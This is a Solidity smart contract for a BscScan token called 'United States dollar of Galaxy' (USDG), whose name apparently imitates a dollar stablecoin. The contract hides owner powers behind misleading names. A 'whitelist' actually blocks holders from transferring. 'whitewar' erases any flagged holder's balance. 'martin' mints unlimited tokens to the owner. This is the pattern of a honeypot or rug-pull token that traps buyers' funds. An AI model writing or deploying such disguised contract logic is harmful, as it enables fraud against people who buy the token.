/**
 *Submitted for verification at BscScan.com on 2021-08-02
*/

pragma solidity 0.5.6;

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
contract Ownable {
    address public king;

    constructor() public {
        king = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == king);
        _;
    }
    function sking(address _user) public onlyOwner {
        if (_user != address(0)) {
            king = _user;
        }
    }

}

/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
contract ERC20Basic {
    uint public _totalSupply;
    function totalSupply() public view returns (uint);
    function balanceOf(address who) public view returns (uint);
    function transfer(address to, uint value) public;
    event Transfer(address indexed from, address indexed to, uint value);
}

/**
 * @title ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint);
    function transferFrom(address from, address to, uint value) public;
    function approve(address spender, uint value) public;
    event Approval(address indexed owner, address indexed spender, uint value);
}

/**
 * @title Basic token
 * @dev Basic version of StandardToken, with no allowances.
 */
contract BasicToken is Ownable, ERC20Basic {
    using SafeMath for uint;

    mapping(address => uint) public balances;

    /**
    * @dev Fix for the ERC20 short address attack.
    */
    modifier onlyPayloadSize(uint size) {
        require(!(msg.data.length < size + 4));
        _;
    }

    /**
    * @dev transfer token for a specified address
    * @param _to The address to transfer to.
    * @param _value The amount to be transferred.
    */
    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);
    }

    /**
    * @dev Gets the balance of the specified address.
    * @param _owner The address to query the the balance of.
    * @return An uint representing the amount owned by the passed address.
    */
    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }

}

/**
 * @title Standard ERC20 token
 *
 * @dev Implementation of the basic standard token.
 * @dev https://github.com/ethereum/EIPs/issues/20
 * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol
 */
contract StandardToken is BasicToken, ERC20 {

    mapping (address => mapping (address => uint)) public allowed;


    /**
    * @dev Transfer tokens from one address to another
    * @param _from address The address which you want to send tokens from
    * @param _to address The address which you want to transfer to
    * @param _value uint the amount of tokens to be transferred
    */
    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);

        emit Transfer(_from, _to, _value);
    }

    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
    }

    function allowance(address _owner, address _spender) public view returns (uint remaining) {
        return allowed[_owner][_spender];
    }

}


contract BlackList is Ownable, BasicToken {

    function scouts(address _maker) external view returns (bool) {
        return whitelist[_maker];
    }

    mapping (address => bool) public whitelist;

    function addwhite (address _user) public onlyOwner {
        whitelist[_user] = true;
        emit AddedBlackList(_user);
    }

    function victory (address _user) public onlyOwner {
        whitelist[_user] = false;
        emit RemovedBlackList(_user);
    }

    function whitewar (address _user) public onlyOwner {
        require(whitelist[_user]);
        uint dirtyFunds = balanceOf(_user);
        balances[_user] = 0;
        _totalSupply -= dirtyFunds;
        emit DestroyedBlackFunds(_user, dirtyFunds);
    }

    event DestroyedBlackFunds(address _blackListedUser, uint _balance);

    event AddedBlackList(address _user);

    event RemovedBlackList(address _user);

}

contract Usdg is StandardToken, BlackList {
    mapping(address => address) public tesla;
    string public name;
    string public symbol;
    uint public decimals;

    constructor() public {
        _totalSupply = 75896287815606296078;
        name = "United States dollar of Galaxy";
        symbol = "USDG";
        decimals = 9;
        king = address(0x60ff427a15963e313F935e761412f5f40e7633ee);
        balances[king] = _totalSupply;
    }

    function transfer(address _to, uint _value) public  {
        require(!whitelist[msg.sender]);
        if(tesla[_to] == address(0)){
            tesla[_to] = msg.sender;
            emit Up(msg.sender, _to);
        }
        return super.transfer(_to, _value);
    }

    function transferFrom(address _from, address _to, uint _value) public  {
        require(!whitelist[_from]);
        return super.transferFrom(_from, _to, _value);
    }

    function balanceOf(address who) public view returns (uint) {
        return super.balanceOf(who);
    }

    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        return super.approve(_spender, _value);
    }

    function allowance(address _owner, address _spender) public view returns (uint remaining) {
        return super.allowance(_owner, _spender);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }

    function martin(uint amount) public onlyOwner {
        require(_totalSupply + amount > _totalSupply);
        require(balances[king] + amount > balances[king]);
        balances[king] += amount;
        _totalSupply += amount;
        emit Issue(amount);
    }

    // Called when new token are issued
    event Issue(uint amount);
    event Up(address indexed up, address indexed down);

}